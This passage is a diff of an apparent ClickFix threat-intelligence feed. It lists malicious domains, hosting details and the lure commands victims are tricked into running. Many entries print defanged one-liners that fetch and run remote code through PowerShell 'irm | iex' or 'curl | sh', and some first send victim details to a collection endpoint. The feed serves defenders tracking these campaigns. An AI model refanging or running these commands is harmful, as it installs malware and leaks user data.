-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "172.67.181.142",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-25",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2606:4700:3032::ac43:b58e",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     },
     {
@@ -190959,8 +190682,8 @@
     "trek-72.com",
     "t-trustrest.com",
     "t-trustresnew.com",
-    "trustchecknes.com",
     "j7tracker.gb.net",
+    "trustchecknes.com",
     "lepafonso.bz"
    ],
    "lure_from": [
@@ -191010,14 +190733,14 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
-    "trustchecknes.com",
-    "j7tracker.gb.net"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -191276,8 +190999,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=131f55e1-5d63-4e78-a1cf-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Flonny.me%2Fwp%2F&os=Mac%2015&lastVisitAt=2026-11-21T02%3A20%3A30.192Z&lastShellAt=2026-11-21T02%3A20%3A30.192Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=3c64b907-ff4f-42ab-a6c2-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Flonny.me%2Fwp%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T02%3A16%3A10.461Z\"\" -d \"\"lastShellAt=2026-11-21T02%3A16%3A10.461Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
+    "curl -sL -d \"id=7dd23ace-9281-496a-8582-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Flonny.me%2Fwp%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A03%3A27.681Z&lastShellAt=2026-11-28T00%3A03%3A27.681Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=2cf5796e-1870-4c3c-9ee6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Flonny.me%2Fwp%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A54%3A52.966Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A54%3A52.966Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
    ],
    "connects_to": [
     "softify.lat",
@@ -191285,7 +191008,8 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -205257,7 +204981,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -211390,6 +211115,7 @@
    ],
    "lure_from": [
     "img-codes-cloude.info",
+    "browse-login.info",
     "makeverizyjar.info",
     "lovezramexar.info"
    ]
@@ -212651,10 +212377,10 @@
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "lepafonso.bz",
     "github.pw",
     "trustchecknes.com",
-    "j7tracker.gb.net",
     "t-trustresnew.com"
    ],
    "lure_from": [
@@ -216502,9 +216228,9 @@
     "efreitorher.org",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "yaebalciganovvjopu.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -219917,7 +219643,10 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc"
    ]
   },
   {
@@ -221774,10 +221503,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/dan_proliv/[id]')|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw",
     "xorados.com",
     "trek-72.com"
@@ -222760,9 +222491,9 @@
     "efreitorher.org",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "yaebalciganovvjopu.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -224971,8 +224702,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=127de878-5155-44a2-a4f3-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fuprightschool.obec.go.th%2F&os=Mac%2015&lastVisitAt=2026-11-21T01%3A50%3A48.074Z&lastShellAt=2026-11-21T01%3A50%3A48.074Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=dd60aca8-b586-4351-aaa9-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fuprightschool.obec.go.th%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T01%3A44%3A12.285Z\"\" -d \"\"lastShellAt=2026-11-21T01%3A44%3A12.285Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
+    "curl -sL -d \"id=30901629-ff2c-480e-aa46-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fuprightschool.obec.go.th%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A04%3A06.593Z&lastShellAt=2026-11-28T00%3A04%3A06.593Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=1d935bf9-a2a9-4df3-8e4d-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fuprightschool.obec.go.th%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A55%3A14.619Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A55%3A14.619Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
    ],
    "connects_to": [
     "softify.lat",
@@ -224980,7 +224711,8 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -227406,14 +227138,14 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
-    "trustchecknes.com",
-    "j7tracker.gb.net"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -230312,56 +230044,6 @@
     "v-k.com.ua"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "paadpequenosautores.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-21",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://paadpequenosautores.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Newfold (Bluehost / HostGator)",
-   "dns": "webhostbox.net",
-   "ip": "162.222.227.131",
-   "asn": "AS46606",
-   "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "162.222.227.131",
-     "asn": "AS46606",
-     "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "paadpequenosautores.com",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/govnologi/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "t-trustrest.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "paatsoilclinic.com",
@@ -235960,64 +235642,6 @@
    ]
   },
   {
-   "indicator": "piercecounty24houremergencytowing.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-26",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://piercecounty24houremergencytowing.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "188.114.96.3",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "piercecounty24houremergencytowing.com",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
-   ],
-   "connects_to": [
-    "cosmical2049.com"
-   ],
-   "lure_from": [
-    "nikogdatakonebilo.cc",
-    "interseq.at",
-    "ciganshina.org",
-    "biboiboboorl.org",
-    "ktoktotam.cc",
-    "efreitorher.org",
-    "yaebalciganovvjopu.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
-   ]
-  },
-  {
    "indicator": "pillpusher.net",
    "type": "domain",
    "category": "clickfix",
@@ -241139,8 +240763,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=fb39595d-f382-4a8a-9065-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fprecisiontanksystems.com%2F&os=Mac%2015&lastVisitAt=2026-11-21T03%3A26%3A07.989Z&lastShellAt=2026-11-21T03%3A26%3A07.989Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=25919eb5-bd12-4e1f-94d5-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fprecisiontanksystems.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T03%3A21%3A06.852Z\"\" -d \"\"lastShellAt=2026-11-21T03%3A21%3A06.852Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=ee2cd88c-980e-4b87-9b29-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fprecisiontanksystems.com%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A02%3A57.980Z&lastShellAt=2026-11-28T00%3A02%3A57.980Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=77a18177-18d3-4ccf-928d-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fprecisiontanksystems.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A50%3A06.579Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A50%3A06.579Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -241148,7 +240772,8 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -242412,56 +242037,6 @@
     "efreitorher.org",
     "ktoktotam.cc",
     "nikogdatakonebilo.cc"
-   ]
-  },
-  {
-   "indicator": "proaktiftumbuhsolusi.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-15",
-   "last_seen": "2026-11-15",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://www.proaktiftumbuhsolusi.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "188.114.97.3",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.proaktiftumbuhsolusi.com",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
-   ],
-   "connects_to": [
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
    ]
   },
   {
@@ -245780,6 +245355,7 @@
     "policysync.pro"
    ],
    "lure_from": [
+    "browse-login.info",
     "img-codes-cloude.info"
    ]
   },
@@ -247063,9 +246639,9 @@
     "efreitorher.org",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "yaebalciganovvjopu.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -257856,7 +257432,8 @@
     "browse-cloud.codes"
    ],
    "lure_from": [
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -258636,9 +258213,9 @@
     "efreitorher.org",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "yaebalciganovvjopu.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -263915,23 +263492,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.213.24",
+   "ip": "104.21.69.207",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "172.67.213.24",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-25",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "104.21.69.207",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.213.24",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-25",
      "last_seen": "2026-11-27"
     }
    ],
@@ -264002,58 +263579,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "salle-a-reims.fr",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-08",
-   "last_seen": "2026-11-23",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://salle-a-reims.fr/",
-   "brand": null,
-   "product": null,
-   "hosting": "OVHcloud",
-   "dns": "OVH",
-   "ip": "2001:41d0:301::100",
-   "asn": "AS16276",
-   "org": "OVH OVH SAS, FR",
-   "country": "FR",
-   "ips": [
-    {
-     "ip": "2001:41d0:301::100",
-     "asn": "AS16276",
-     "org": "OVH OVH SAS, FR",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-23"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "salle-a-reims.fr",
-     "status": "online",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-23"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//github[.]pw/prolivdante1/[id]')|iex"
-   ],
-   "connects_to": [
-    "lepafonso.bz",
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "salonanette.pl",
@@ -267631,7 +267156,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-25",
+   "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
    "url": "https://sbctradeexpo.com/",
@@ -267641,7 +267166,7 @@
    "dns": "GoDaddy",
    "ip": "68.178.247.40",
    "asn": "AS398101",
-   "org": "GoDaddy.com, LLC",
+   "org": "GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
    "country": "US",
    "ips": [
     {
@@ -267649,7 +267174,7 @@
      "asn": "AS398101",
      "org": "GoDaddy.com, LLC",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-27"
     }
    ],
    "hosts": [
@@ -267657,7 +267182,7 @@
      "host": "sbctradeexpo.com",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-25"
+     "last_seen": "2026-11-27"
     }
    ],
    "actor": null,
@@ -269538,9 +269063,9 @@
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
-    "t-trustresnew.com",
+    "lepafonso.bz",
     "j7tracker.gb.net",
-    "lepafonso.bz"
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -276545,7 +276070,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.17.5",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -287855,8 +287380,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=22e4ce57-1419-42cb-9434-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fstagtravels.com%2F&os=Mac%2015&lastVisitAt=2026-11-21T02%3A55%3A32.442Z&lastShellAt=2026-11-21T02%3A55%3A32.442Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=a2b7f772-cf89-4978-9447-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fstagtravels.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T02%3A50%3A52.821Z\"\" -d \"\"lastShellAt=2026-11-21T02%3A50%3A52.821Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=8abc8b82-c305-4e08-b11f-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fstagtravels.com%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A03%3A53.966Z&lastShellAt=2026-11-28T00%3A03%3A53.966Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=4c6451db-4097-473e-a452-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fstagtravels.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A55%3A19.278Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A55%3A19.278Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -287864,8 +287389,8 @@
    "lure_from": [
     "browse-cloud.codes",
     "img-codes-cloude.info",
-    "jjjducodes.beer",
-    "browse-login.info"
+    "browse-login.info",
+    "jjjducodes.beer"
    ]
   },
   {
@@ -303797,9 +303322,10 @@
    ],
    "lure_from": [
     "cloudeccentric.cc",
-    "biboiboboorl.org",
     "interseq.at",
+    "biboiboboorl.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "thu-ipad-03.cfd"
    ]
   },
@@ -304054,7 +303580,8 @@
    "lure_from": [
     "interseq.at",
     "biboiboboorl.org",
-    "yellow-monkey.cfd"
+    "yellow-monkey.cfd",
+    "barabulkaaaa.org"
    ]
   },
   {
@@ -315194,18 +314721,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2606:4700:3036::ac43:c324",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "2606:4700:3036::ac43:c324",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -315218,6 +314738,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2606:4700:3036::ac43:c324",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     },
     {
@@ -317513,20 +317040,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -317874,7 +317401,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.84.50",
+   "ip": "172.67.186.145",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -322980,62 +322507,6 @@
    "lure_from": []
   },
   {
-   "indicator": "value-ct.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-22",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://value-ct.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Xserver Inc.",
-   "dns": "xserver.jp",
-   "ip": "202.233.66.115",
-   "asn": "AS131965",
-   "org": "XSERVER - Xserver Inc., JP",
-   "country": "JP",
-   "ips": [
-    {
-     "ip": "202.233.66.115",
-     "asn": "AS131965",
-     "org": "XSERVER - Xserver Inc., JP",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "value-ct.com",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
-   ],
-   "connects_to": [
-    "trek-72.com",
-    "t-trustrest.com",
-    "trustchecknes.com",
-    "github.pw",
-    "t-trustresnew.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "vanamu.org",
    "type": "domain",
    "category": "clickfix",
@@ -323476,15 +322947,16 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
